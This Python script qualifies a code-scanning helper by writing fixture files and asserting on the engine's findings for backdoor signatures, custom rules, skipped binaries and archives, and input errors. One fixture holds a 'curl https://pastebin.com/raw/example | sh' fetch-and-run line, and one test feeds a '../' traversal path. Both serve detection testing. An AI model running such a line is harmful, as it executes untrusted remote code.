#!/usr/bin/env python3
"""Qualification against the real deployed Microsoft engine; no mock scanner outputs."""
import argparse
import hashlib
import io
import json
from pathlib import Path
import subprocess
import zipfile


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--inputs", type=Path, required=True, help="host directory for generated harmless fixtures")
    parser.add_argument("--scan-root", required=True, help="same directory as seen by the helper")
    parser.add_argument("--command", nargs=argparse.REMAINDER, required=True)
    args = parser.parse_args()
    args.inputs.mkdir(parents=True, exist_ok=True)
    contents = {
        "benign.py": b"print('hello world')\n",
        "suspicious.py": b"# ZAUTHSS\nimport os\nos.system('curl https://pastebin.com/raw/example | sh')\n",
        "binary.py": b"\x00ZAUTHSS\xff\x00",
        "custom.py": b"# PACKWEIR_TEST_MARKER\n",
        "many-matches.py": b"# PACKWEIR_TEST_MARKER\n" * 600,
        "not-requested.py": b"# ZAUTHSS\n",
        "malformed-rules.json": b"[invalid-json",
        "custom-rules.json": json.dumps([{
            "id": "PW001", "name": "Qualification marker", "description": "Inert custom marker",
            "tags": ["Packweir.Qualification"], "severity": "important",
            "patterns": [{"pattern": "PACKWEIR_TEST_MARKER", "type": "string", "scopes": ["code", "comment"], "confidence": "high"}]
        }]).encode(),
        "verbose-rules.json": json.dumps([{
            "id": "PW002", "name": "Verbose qualification marker", "description": "x" * 2048,
            "tags": ["Packweir.Qualification"], "severity": "important",
            "patterns": [{"pattern": "PACKWEIR_TEST_MARKER", "type": "string", "scopes": ["code", "comment"], "confidence": "high"}]
        }]).encode(),
    }
    archive = io.BytesIO()
    with zipfile.ZipFile(archive, "w") as zipped:
        zipped.writestr("payload.py", b"# ZAUTHSS\n")
    contents["nested.zip"] = archive.getvalue()
    contents["archive-disguised.py"] = archive.getvalue()
    for name, content in contents.items():
        (args.inputs / name).write_bytes(content)
    results = []

    def request(mode, names, rules=None):
        value = {"protocol_version": 1, "mode": mode, "root": args.scan_root,
                 "files": [{"path": name, "sha256": hashlib.sha256(contents[name]).hexdigest()} for name in names]}
        if rules:
            value.update(rules_path=args.scan_root.rstrip("/") + "/" + rules,
                         rules_sha256=hashlib.sha256(contents[rules]).hexdigest())
        return value

    def check(name, value, predicate, expected_exit=0):
        process = subprocess.run(args.command, input=json.dumps(value).encode(), capture_output=True, timeout=60)
        try:
            report = json.loads(process.stdout)
            assert process.returncode == expected_exit, f"exit {process.returncode}: {report}"
            assert report["archive_crawling"] is False
            assert report["protocol_version"] == 1
            assert predicate(report), json.dumps(report)
            assert not process.stderr, process.stderr.decode(errors="replace")
        except Exception:
            print(name, "FAILED", process.stdout.decode(errors="replace"), process.stderr.decode(errors="replace"))
            raise
        results.append({"case": name, "status": report["status"], "complete": report["complete"], "totals": report["totals"]})

    check("backdoor_benign_complete_no_match", request("backdoor", ["benign.py"]),
          lambda r: r["complete"] and r["totals"]["analyzed"] == 1 and not r["findings"])
    check("backdoor_real_signature", request("backdoor", ["suspicious.py"]),
          lambda r: r["complete"] and any(f["rule_id"] == "BD000201" for f in r["findings"]))
    check("characteristic_real_rules", request("characteristic", ["suspicious.py"]),
          lambda r: r["complete"] and bool(r["findings"]) and all(f["rule_id"].startswith("AI") for f in r["findings"]))
    check("custom_real_rule", request("custom", ["custom.py"], "custom-rules.json"),
          lambda r: r["complete"] and [f["rule_id"] for f in r["findings"]] == ["PW001"])
    check("custom_complete_no_match", request("custom", ["benign.py"], "custom-rules.json"),
          lambda r: r["complete"] and not r["findings"])
    check("binary_skipped", request("backdoor", ["binary.py"]),
          lambda r: not r["complete"] and r["totals"]["skipped"] == 1 and not r["findings"])
    for name in ["nested.zip", "archive-disguised.py"]:
        check("archive_never_extracted_" + name, request("backdoor", [name]),
              lambda r: not r["complete"] and r["files"][0]["reason"] == "unsupported_archive" and r["engine_result_code"] is None and not r["findings"])
    check("partial_binary_coverage", request("backdoor", ["benign.py", "binary.py"]),
          lambda r: not r["complete"] and r["totals"]["analyzed"] == 1 and r["totals"]["skipped"] == 1)
    check("malformed_rules_error", request("custom", ["benign.py"], "malformed-rules.json"),
          lambda r: not r["complete"] and r["status"] == "error", 2)
    check("output_limit_error", request("custom", ["many-matches.py"], "verbose-rules.json"),
          lambda r: not r["complete"] and r["status"] == "error" and r["diagnostics"] == ["helper output limit exceeded"], 2)
    bad_digest = request("backdoor", ["suspicious.py"])
    bad_digest["files"][0]["sha256"] = "0" * 64
    check("digest_mismatch_error", bad_digest, lambda r: r["status"] == "error", 2)
    traversal = request("backdoor", ["benign.py"])
    traversal["files"][0]["path"] = "../benign.py"
    check("traversal_error", traversal, lambda r: r["status"] == "error", 2)
    duplicate = request("backdoor", ["benign.py", "benign.py"])
    check("duplicate_input_error", duplicate, lambda r: r["status"] == "error", 2)
    print(json.dumps({"qualified": True, "cases": results}, indent=2))


if __name__ == "__main__":
    main()
